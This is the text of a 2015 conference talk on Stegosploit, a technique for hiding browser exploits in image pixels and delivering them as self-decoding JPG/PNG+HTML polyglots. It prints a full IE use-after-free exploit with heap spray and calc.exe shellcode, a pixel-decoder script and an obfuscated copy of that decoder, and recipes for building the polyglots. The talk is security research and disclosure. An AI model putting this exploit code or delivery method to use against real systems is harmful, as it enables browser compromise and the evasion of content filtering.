STEGOSPLOIT

BROWSER EXPLOITS USING ONLY IMAGES
NETSQUARE

SAUMIL SHAH
BLACKHAT EUROPE 2015

~ HAPPY DIWALI ~
NETSQUARE

Saumil Shah
CEO, Net-Square
hacker, trainer, speaker, author, photographer educating, entertaining and exasperating audiences since 1999.

@therealsaumil saumilshah

NETSQUARE

NETSQUARE

Stegosploit is...
not a 0-day attack with a cute logo not exploit code hidden in EXIF not a PHP/ASP webshell not a new XSS vector
Stegosploit is ...
``Browser Exploits Delivered as Pictures.``
NETSQUARE

NETSQUARE

"A good exploit is one that is delivered in style"
· Only VALID images on network and disk.
· Exploit code hidden in pixels. · Decoder code embedded in
image. · Exploit automatically decoded
and triggered upon loading... · ...all with just ONE IMAGE.

Steganography
NETSQUARE

Polyglots
Two or more data formats in a single container...
NETSQUARE

EXPLOIT CODE
PIXEL ENCODER
IMAGE

STEGODECODER
JAVASCRIPT

ENCODED IMAGE
IMAJS

Stegosploit-ing a browser exploit
Case study: CVE-2014-0282 - IE CInput Use-After-Free - hidden in a JPG
Case study: CVE-2013-1690 - FF onreadystatechange UAF - hidden in a PNG

NETSQUARE

POLYGLOT

TARGET BROWSER

The Stegosploit Toolkit

STEGANOGRAPHY TOOLS - image_layer_analysis.html - iterative_encoding.html - image_decoder.html

- analyse an image's bit layers - steganographic encoder - test for any encoding errors

POLYGLOT TOOLS - imajs_jpg.pl - imajs_png.pl

- make a JPG+HTML+JS polyglot - make a PNG+HTML+JS polyglot

EXPLOITS - exploits.js - cve_2014_0282.template - decode_pixels.js
NETSQUARE

- collection of browser exploits - exploit HTML template - JS Steganography decoder

Step 1.

Hiding the Exploit

Code in the Image
IMAGE

EXPLOIT CODE
PIXEL ENCODER

NETSQUARE

ENCODED IMAGE

Hiding an Exploit in an Image
· Simple steganography techniques. · Encode exploit code bitstream into
lesser significant bits of RGB values. · Spread the pixels around e.g. 4x4 grid.
NETSQUARE

Hiding an Exploit in an Image

"SAUMIL" = 01010011 01000001 01010101 01001101
01001001 01001100

............................................................

NETSQUARE

Hiding an Exploit in an Image

ganesha.jpg

function H5(){this.d=[];this.m=new Array();this.f=new Array()}H5.prototype.flatten=function(){for(var f=0;f<this.d.length;f+ +){var n=this.d[f];if(typeof(n)=='number'){var c=n.toString(16);while(c.length<8){c='0'+c}var l=function(a) {return(parseInt(c.substr(a,2),16))};var g=l(6),h=l(4),k=l(2),m=l(0);this.f.push(g);this.f.push(h);this.f.push(k);this.f.push(m)}if(typeof(n)=='string'){for(var d=0;d<n.length;d++){this.f.push(n.charCodeAt(d))}}}};H5.prototype.fill=function(a){for(var c=0,b=0;c<a.data.length;c++,b ++){if(b>=8192){b=0}a.data[c]=(b<this.f.length)?this.f[b]:255}};H5.prototype.spray=function(d){this.flatten();for(var b=0;b<d;b++){var c=document.createElement('canvas');c.width=131072;c.height=1;var a=c.getContext('2d').createImageData(c.width,c.height);this.fill(a);this.m[b]=a}};H5.prototype.setData=function(a) {this.d=a};var flag=false;var heap=new H5();try{location.href='ms-help:'}catch(e){}function spray(){var a='\xfc \xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a \x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c \x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b \x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b \x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a \x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb \xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff \xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00';var c=[];for(var b=0;b<1104;b+=4){c.push(1371756628)} c.push(1371756627);c.push(1371351263);var f=[1371756626,215,2147353344,1371367674,202122408,4294967295,202122400,202122404,64,202116108,2021212 48,16384];var d=c.concat(f);d.push(a);heap.setData(d);heap.spray(256)}function changer(){var c=new Array();for(var a=0;a<100;a++){c.push(document.createElement('img'))}if(flag) {document.getElementById('fm').innerHTML='';CollectGarbage();var b='\u2020\u0c0c';for(var a=4;a<110;a+=2){b +='\u4242'}for(var a=0;a<c.length;a++){c[a].title=b}}}function run() {spray();document.getElementById('c2').checked=true;document.getElementById('c2').onpropertychange=changer;flag= true;document.getElementById('fm').reset()}setTimeout(run,1000);
IE Use-After-Free CVE-2014-0282

NETSQUARE

The "Bit Layer" View

1 pixel = 8 bits (grayscale)
NETSQUARE

7 6 5 4 3 2 1 0

|

|

MSB

LSB

7
The "Bit Layer" View
5

6
more shape less detail
4

3

2

NETSQUARE

1

0

less shape more detail

NETSQUARE

7

6

5

4

3

2

1

0

NETSQUARE

Encoding at Bit Layer 7

Exploit code converted to bitstream.
Pixel bits of layer 7 are overwritten with exploit bitstream.
NETSQUARE

76 5 4 3 2 1 0

|

|

MSB

LSB

Encoding data at bit layer 7

Significant visual aberration

Encoding at Bit Layer 2

Exploit code converted to bitstream.
Pixel bits of layer 2 are overwritten with exploit bitstream.
NETSQUARE

76 5 4 3 2 1 0

|

|

MSB

LSB

Encoding data at bit layer 2

No perceptible visual aberration

Encoding on JPG vs PNG

· JPG = lossy compression
· Pixels approximated to nearest neighbours
· Multi-pass encoding
· Min. layer = 2 or 3
· Browser specific JPEG encoders

· PNG = lossless compression
· Single pass encoding
· Min. layer = 0
· Negligible visual distortion
· Independent of browser's PNG encoder

NETSQUARE

Step 2.

Decoding the encoded Pixel Data

NETSQUARE

STEGODECODER
JAVASCRIPT

ENCODED IMAGE
?

HTML5 CANVAS to the rescue!
· In-browser decoding of steganographically encoded images.
· Read image pixel data using JS. · Rebuild JS exploit code from pixel data,
in memory. · Simple array and bit manipulation
operations.
NETSQUARE

decode_pixels.js
L=2,C=3,G=3,a=[],x=y=0,z=1<<L,I=parseInt,S=String.fromCharCode;window.onload= function(){P.onclick=function({V=document.createElement("canvas");k=P.parentNode; k.insertBefore(V,P);W=V.width=P.width;H=V.height=P.height;m=V.getContext("2d"); m.drawImage(P,0,0);k.removeChild(P);m=m.getImageData(0,0,W,H).data;c=function(p,x,y) {n=(y*W+x)*4;r=(p[n]&z)>>L;g=(p[n+1]&z)>>L;b=(p[n+2]&z)>>L;return S([r,g,b,r][C]+48)}; k=function(l){for(i=j=0;j<l*8;j++){a[i++]=c(m,x,y);x+=G;if(x>=W){x=0;y+=G}}};k(6); k(I(X(a)));try{CollectGarbage()}catch(e){}setTimeout(new Function(X(a)),99)}};function X(c){s="",d=c.join(s);for(i=0;i<d.length;i+=8)s+=S(I(d.substr(i,8),2));return s}
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$) +"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+"\\"+$.__$+$.__$+$.$__+"="+$._$_+",\\"+$.__$+$.___+$._$$+"="+$._$$+",\\"+ $.__$+$.___+$.$$$+"="+$._$$+","+$.$_$_+"=[],\\"+$.__$+$.$$$+$.___+"=\\"+$.__$+$.$$$+$.__$+"="+$.___+",\\"+$.__$+$.$$$+$._$_+"="+$.__$+"<<\\"+$.__$+$.__$+$.$__+",\\"+$.__$+$.__$+$.__$+"=\\"+$.__$+$.$$_+$.___+$.$_$_+"\\"+$.__$+$.$$_+$._$_+"\\"+ $.__$+$.$$_+$._$$+$.$$$_+"\\"+$.__$+$.__$+$.__$+"\\"+$.__$+$.$_$+$.$$_+$.__+",\\"+$.__$+$._$_+$._$$+"=\\"+$.__$+$._$_+$._$$+$.__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$__+$.$$$+"."+$.$$$$+"\\"+$.__$+ $.$$_+$._$_+$._$+"\\"+$.__$+$.$_$+$.$_$+"\\"+$.__$+$.___+$._$$+"\\"+$.__$+$.$_$+$.___+$.$_$_+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.___+$._$$+$._$+$.$$_$+$.$$$_+";\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$$_+$.$$_$+$._$+"\ \"+$.__$+$.$$_+$.$$$+"."+$._$+"\\"+$.__$+$.$_$+$.$$_+(![]+"")[$._$_]+$._$+$.$_$_+$.$$_$+"="+$.$$$$+$._+"\\"+$.__$+$.$_$+$.$$_+$.$$__+$.__+"\\"+$.__$+$.$_$+$.__$+$._$+"\\"+$.__$+$.$_$+$.$$_+"(){\\"+$.__$+$._$_+$.___+"."+$._$+"\\"+$.__$+$.$_$+$.$$_ +$.$$__+(![]+"")[$._$_]+"\\"+$.__$+$.$_$+$.__$+$.$$__+"\\"+$.__$+$.$_$+$._$$+"="+$.$$$$+$._+"\\"+$.__$+$.$_$+$.$$_+$.$$__+$.__+"\\"+$.__$+$.$_$+$.__$+$._$+"\\"+$.__$+$.$_$+$.$$_+"(){\\"+$.__$+$._$_+$.$$_+"="+$.$$_$+$._$+$.$$__+$._+"\\"+$.__$+$. $_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+"."+$.$$__+"\\"+$.__$+$.$$_+$._$_+$.$$$_+$.$_$_+$.__+$.$$$_+"\\"+$.__$+$.___+$.$_$+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+"(\\\""+$.$$__+$.$_$_+"\\"+$.__$+$. $_$+$.$$_+"\\"+$.__$+$.$$_+$.$$_+$.$_$_+"\\"+$.__$+$.$$_+$._$$+"\\\");\\"+$.__$+$.$_$+$._$$+"=\\"+$.__$+$._$_+$.___+".\\"+$.__$+$.$$_+$.___+$.$_$_+"\\"+$.__$+$.$$_+$._$_+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+"\\"+$.__$+$.__$+$.$$_+$._$+$.$$_$+$.$$ $_+";\\"+$.__$+$.$_$+$._$$+".\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$$_+$._$$+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"\\"+$.__$+$.___+$._$_+$.$$$_+$.$$$$+$._$+"\\"+$.__$+$.$$_+$._$_+$.$$$_+"(\\"+$.__$+$._$_+$.$$_+",\\"+$.__$+$._ $_+$.___+");\\"+$.__$+$._$_+$.$$$+"=\\"+$.__$+$._$_+$.$$_+".\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$_$+$.__$+$.$$_$+$.__+"\\"+$.__$+$.$_$+$.___+"=\\"+$.__$+$._$_+$.___+".\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$_$+$.__$+$.$$_$+$.__+"\\"+$.__$+$.$_$+ $.___+";\\"+$.__$+$.__$+$.___+"=\\"+$.__$+$._$_+$.$$_+".\\"+$.__$+$.$_$+$.___+$.$$$_+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$__+$.$$$+"\\"+$.__$+$.$_$+$.___+$.__+"=\\"+$.__$+$._$_+$.___+".\\"+$.__$+$.$_$+$.___+$.$$$_+"\\"+$.__$+$.$_$+$.__$+"\\"+ $.__$+$.$__+$.$$$+"\\"+$.__$+$.$_$+$.___+$.__+";\\"+$.__$+$.$_$+$.$_$+"=\\"+$.__$+$._$_+$.$$_+".\\"+$.__$+$.$__+$.$$$+$.$$$_+$.__+"\\"+$.__$+$.___+$._$$+$._$+"\\"+$.__$+$.$_$+$.$$_+$.__+$.$$$_+"\\"+$.__$+$.$$$+$.___+$.__+"(\\\""+$._$_+$.$$_$+"\\ \");\\"+$.__$+$.$_$+$.$_$+"."+$.$$_$+"\\"+$.__$+$.$$_+$._$_+$.$_$_+"\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.__$+$.__$+"\\"+$.__$+$.$_$+$.$_$+$.$_$_+"\\"+$.__$+$.$__+$.$$$+$.$$$_+"(\\"+$.__$+$._$_+$.___+","+$.___+","+$.___+");\\"+$.__$+$.$_$+$._$$+".\\"+ $.__$+$.$$_+$._$_+$.$$$_+"\\"+$.__$+$.$_$+$.$_$+$._$+"\\"+$.__$+$.$$_+$.$$_+$.$$$_+"\\"+$.__$+$.___+$._$$+"\\"+$.__$+$.$_$+$.___+"\\"+$.__$+$.$_$+$.__$+(![]+"")[$._$_]+$.$$_$+"(\\"+$.__$+$._$_+$.___+");\\"+$.__$+$.$_$+$.$_$+"=\\"+$.__$+$.$_$+$.$_ $+".\\"+$.__$+$.$__+$.$$$+$.$$$_+$.__+"\\"+$.__$+$.__$+$.__$+"\\"+$.__$+$.$_$+$.$_$+$.$_$_+"\\"+$.__$+$.$__+$.$$$+$.$$$_+"\\"+$.__$+$.___+$.$__+$.$_$_+$.__+$.$_$_+"("+$.___+","+$.___+",\\"+$.__$+$._$_+$.$$$+",\\"+$.__$+$.__$+$.___+")."+$.$$_$+ $.$_$_+$.__+$.$_$_+";"+$.$$__+"="+$.$$$$+$._+"\\"+$.__$+$.$_$+$.$$_+$.$$__+$.__+"\\"+$.__$+$.$_$+$.__$+$._$+"\\"+$.__$+$.$_$+$.$$_+"(\\"+$.__$+$.$$_+$.___+",\\"+$.__$+$.$$$+$.___+",\\"+$.__$+$.$$$+$.__$+"){\\"+$.__$+$.$_$+$.$$_+"=(\\"+$.__$+$.$$ $+$.__$+"*\\"+$.__$+$._$_+$.$$$+"+\\"+$.__$+$.$$$+$.___+")*"+$.$__+";\\"+$.__$+$.$$_+$._$_+"=(\\"+$.__$+$.$$_+$.___+"[\\"+$.__$+$.$_$+$.$$_+"]&\\"+$.__$+$.$$$+$._$_+")>>\\"+$.__$+$.__$+$.$__+";\\"+$.__$+$.$__+$.$$$+"=(\\"+$.__$+$.$$_+$.___+"[\\"+ $.__$+$.$_$+$.$$_+"+"+$.__$+"]&\\"+$.__$+$.$$$+$._$_+")>>\\"+$.__$+$.__$+$.$__+";"+$.$_$$+"=(\\"+$.__$+$.$$_+$.___+"[\\"+$.__$+$.$_$+$.$$_+"+"+$._$_+"]&\\"+$.__$+$.$$$+$._$_+")>>\\"+$.__$+$.__$+$.$__+";\\"+$.__$+$.$$_+$._$_+$.$$$_+$.__+$._+"\\"+ $.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.$__+$.___+"\\"+$.__$+$._$_+$._$$+"([\\"+$.__$+$.$$_+$._$_+",\\"+$.__$+$.$__+$.$$$+","+$.$_$$+",\\"+$.__$+$.$$_+$._$_+"][\\"+$.__$+$.___+$._$$+"]+"+$.$__+$.$___+")};\\"+$.__$+$.$_$+$._$$+"="+$.$$$$+ $._+"\\"+$.__$+$.$_$+$.$$_+$.$$__+$.__+"\\"+$.__$+$.$_$+$.__$+$._$+"\\"+$.__$+$.$_$+$.$$_+"("+(![]+"")[$._$_]+"){"+$.$$$$+$._$+"\\"+$.__$+$.$$_+$._$_+"(\\"+$.__$+$.$_$+$.__$+"=\\"+$.__$+$.$_$+$._$_+"="+$.___+";\\"+$.__$+$.$_$+$._$_+"<"+(![]+"")[$._$_] +"*"+$.$___+";\\"+$.__$+$.$_$+$._$_+"++){"+$.$_$_+"[\\"+$.__$+$.$_$+$.__$+"++]="+$.$$__+"(\\"+$.__$+$.$_$+$.$_$+",\\"+$.__$+$.$$$+$.___+",\\"+$.__$+$.$$$+$.__$+");\\"+$.__$+$.$$$+$.___+"+=\\"+$.__$+$.___+$.$$$+";\\"+$.__$+$.$_$+$.__$+$.$$$$+"(\\"+ $.__$+$._$_+$.$$$+"<\\"+$.__$+$.$$$+$.___+"){\\"+$.__$+$.$$$+$.___+"="+$.___+";\\"+$.__$+$.$$$+$.__$+"+=\\"+$.__$+$.___+$.$$$+"}}};\\"+$.__$+$.$_$+$._$$+"("+$.$$_+");\\"+$.__$+$.$_$+$._$$+"(\\"+$.__$+$.__$+$.__$+"(\\"+$.__$+$._$$+$.___+"("+$.$_$_ +")));"+$.__+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$$$+$.__$+"{\\"+$.__$+$.___+$._$$+$._$+(![]+"")[$._$_]+(![]+"")[$._$_]+$.$$$_+$.$$__+$.__+"\\"+$.__$+$.___+$.$$$+$.$_$_+"\\"+$.__$+$.$$_+$._$_+$.$_$$+$.$_$_+"\\"+$.__$+$.$__+$.$$$+$.$$$_+"()}"+$.$$__+ $.$_$_+$.__+$.$$__+"\\"+$.__$+$.$_$+$.___+"("+$.$$$_+"){}\\"+$.__$+$.$$_+$._$$+$.$$$_+$.__+"\\"+$.__$+$._$_+$.$__+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+$._$+$._+$.__+"(\\"+$.__$+$.$_$+$.$$_+$.$$$_+"\\"+$.__$+$.$$_+$.$$$+"\\"+$. $__+$.___+"\\"+$.__$+$.___+$.$$_+$._+"\\"+$.__$+$.$_$+$.$$_+$.$$__+$.__+"\\"+$.__$+$.$_$+$.__$+$._$+"\\"+$.__$+$.$_$+$.$$_+"(\\"+$.__$+$._$$+$.___+"("+$.$_$_+")),"+$.$__$+$.$__$+")}};"+$.$$$$+$._+"\\"+$.__$+$.$_$+$.$$_+$.$$__+$.__+"\\"+$.__$+$. $_$+$.__$+$._$+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.$__+$.___+"\\"+$.__$+$._$$+$.___+"("+$.$$__+"){\\"+$.__$+$.$$_+$._$$+"=\\\"\\\","+$.$$_$+"="+$.$$__+".\\"+$.__$+$.$_$+$._$_+$._$+"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$_$+$.$$_+"(\\"+$.__$+$.$$_+$._$$+");"+ $.$$$$+$._$+"\\"+$.__$+$.$$_+$._$_+"(\\"+$.__$+$.$_$+$.__$+"="+$.___+";\\"+$.__$+$.$_$+$.__$+"<"+$.$$_$+"."+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.__$+$.$__+$.$$$+$.__+"\\"+$.__$+$.$_$+$.___+";\\"+$.__$+$.$_$+$.__$+"+="+$.$___+")\\"+ $.__$+$.$$_+$._$$+"+=\\"+$.__$+$._$_+$._$$+"(\\"+$.__$+$.__$+$.__$+"("+$.$$_$+".\\"+$.__$+$.$$_+$._$$+$._+$.$_$$+"\\"+$.__$+$.$$_+$._$$+$.__+"\\"+$.__$+$.$$_+$._$_+"(\\"+$.__$+$.$_$+$.__$+","+$.$___+"),"+$._$_+"));\\"+$.__$+$.$$_+$._$_+$.$$$_+ $.__+$._+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.$$_+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$._$$+"}"+"\"")())();
NETSQUARE

Step 3.
Images that ``Auto Run``
STEGODECODER
JAVASCRIPT

ENCODED IMAGE
IMAJS

NETSQUARE

POLYGLOT

I SEE PIXELS

I SEE CODE

IMAJS
NETSQUARE

IMAJS - Image+JS Polyglot

Image

<img> sees pixels <script> sees code
#YourPointOfView

Javascript

Holy Sh** Bipolar Content!

NETSQUARE

IMAJS-JPG!
I

JPG

JPG +HTML +JS +CSS

NETSQUARE

Hat tip: Michael Zalewski @lcamtuf

IMAJS-JPG Recipe
NETSQUARE

SOI APP0
DQT
DQT
SOF0 DHT

IMAJS-JPG Recipe

FF D8
FF E0 length J F I F \0 shhh..
versn U Xresdon't Yterlles FF DB quantization tabalenysone

H V

FF DB quantization tables

FF C0 start of frame FF C4 Huffman tables

NETSQUARE

SOI APP0
DQT DQT SOF0 DHT
NETSQUARE

IMAJS-JPG Recipe
FF D8 FF E0 length J F I F \0
versn U Xres Yres H V <html random random random random... random ><head random> decoder script and other HTML stuff goes here... <script type=text/undefined> ... ... more random data ... FF DB quantization tables
FF DB quantization tables
FF C0 start of frame FF C4 Huffman tables

IMAJS-PNG!
I

PNG

PNG +HTML +JS +CSS
NETSQUARE

IMAJS-PNG Recipe

PNG Header IHDR IDAT chunk IDAT chunk IDAT chunk IEND chunk

89 50 4E 47 0D 0A 1A 0A

length IHDR chunk data

CRC

length IDAT pixel data

CRC

length IDAT pixel data

CRC

length IDAT pixel data

CRC

0

IEND CRC

NETSQUARE

www.fourcc.org

IMAJS-PNG Recipe

PNG Header IHDR extra tEXt chunk
IDAT chunk IDAT chunk IDAT chunk IEND chunk

89 50 4E 47 0D 0A 1A 0A

length IHDR chunk data

CRC

length tEXt _00<html random random ...

random><head random> decoder script

and other HTML stuff goes here...

<script type=text/undefined>... CRC

length IDAT pixel data

CRC

length IDAT pixel data

CRC

length IDAT pixel data

CRC

0

IEND CRC

NETSQUARE

Inspiration: http://daeken.com/superpacking-js-demos

Step 4.
The Finer Points of Package Delivery
NETSQUARE

Content Sniffing
NETSQUARE

Expires and Cache-Control

Clever CSS

Content Sniffing

NETSQUARE

Credits: Michael Zalewski @lcamtuf

< PAYLOADS GO back in time

I'M IN UR BASE
GET /lolcat.png 200 OK Expires: 6 months

....KILLING UR DOODZ
GET /lolcat.png
Load from cache

Exploit code encoded in image. EVIL

Decoder script references image from cache. SAFE

AUG 2015
NETSQUARE

DEC 2015

NETSQUARE

Tools

Paper

PoC||GTFO 0x08
NETSQUARE

http://stegosploit.info

Conclusions - Offensive
· Weird containers, weird encoding, weird obfuscation.
· Stego attacks emerging "in the wild". · PDF+Flash / HTML+JS+FLASH / ???
NETSQUARE

Conclusions - Defensive
· DFIR nightmare.
­ how far back does your window of inspection go?
· Can't rely on magic numbers, file extensions, file types.
· Quick "fix" ­ re-encode all images!
NETSQUARE

Browsers and W3C - Wake Up!
BROWSERS · Don't be afraid to "BREAK THE WEB". · Reject content that does not conform to
strict standards/specs. W3C · STRICT parsing rules ­ like COMPILERS. · Browser compliance and user-
awareness is YOUR responsibility.
NETSQUARE

NETSQUARE

KTHXBAI
Saumil Shah
@therealsaumil saumilshah saumil@net-square.com
Photography: flickr.com/saumil www.spectral-lines.in
NETSQUARE

